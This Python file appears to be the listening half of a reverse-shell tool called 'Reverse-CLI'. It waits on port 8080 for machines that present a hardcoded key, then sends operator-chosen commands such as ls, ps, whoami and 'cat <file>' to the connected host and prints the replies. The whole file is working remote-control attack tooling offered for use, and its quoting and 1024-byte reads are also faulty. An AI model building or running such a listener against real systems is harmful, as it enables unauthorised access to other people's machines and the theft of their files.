import socket
import shlex

def start():
    GREEN = '\033[92m'
    RED = '\033[91m'
    RESET = '\033[0m'

    host = '0.0.0.0'
    port = 8080
    keys = ['secretkey1', 'secretkey2', 'secretkey3']

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.bind((host, port))
        s.listen(5)
        print(f'               {GREEN}      Reverse-CLI   {RESET} \n')
        print(f'{GREEN}Developer: Invictus27 \n{RESET}')
        print(f'{GREEN}[*] Listening on {host}:{port}{RESET} ')
    except Exception as e:
        print(f'{RED}Error: Reverse shell not working! {e}{RESET}')
        return

    while True:
        conn, addr = s.accept()
        client_key = conn.recv(1024).decode()
        if client_key not in keys:
            conn.close()
            continue
        else:
            print(f'{GREEN}{addr} has been connected{RESET}')
            conn.sendall('Authentication successful'.encode())

        print(f'{GREEN}     Options    {RESET}\n ')
        print(f'{GREEN}[*] ls\n[*] netstat\n[*] ifconfig\n[*] ps\n[*] df\n[*] whoami\n[*]cat\n[*]file\n[*]exit\n{RESET}')
        while True:
            cmd = input(f'{GREEN}>>> {RESET}')

            if cmd == 'exit':
                conn.close()
                break
            elif cmd in ['ls', 'netstat', 'ifconfig', 'ps', 'df', 'whoami','pwd']:
                cmd = shlex.quote(cmd)
                try:
                    conn.sendall(cmd.encode())
                    response = conn.recv(1024).decode()
                    print(response)
                except Exception as e:
                    print(f'{RED}Error sending/receiving data: {e}{RESET}')
                    conn.close()
                    break
            elif cmd.startswith('cat ') or cmd.startswith('file '):
                cmd = shlex.quote(cmd)
                try:
                    conn.sendall(cmd.encode())
                    response = conn.recv(1024).decode()
                    print(response)
                except Exception as e:
                    print(f'{RED}Error sending/receiving data: {e}{RESET}')
                    conn.close()
                    break
            else:
                print(f'{RED}Invalid command!{RESET}')

start()
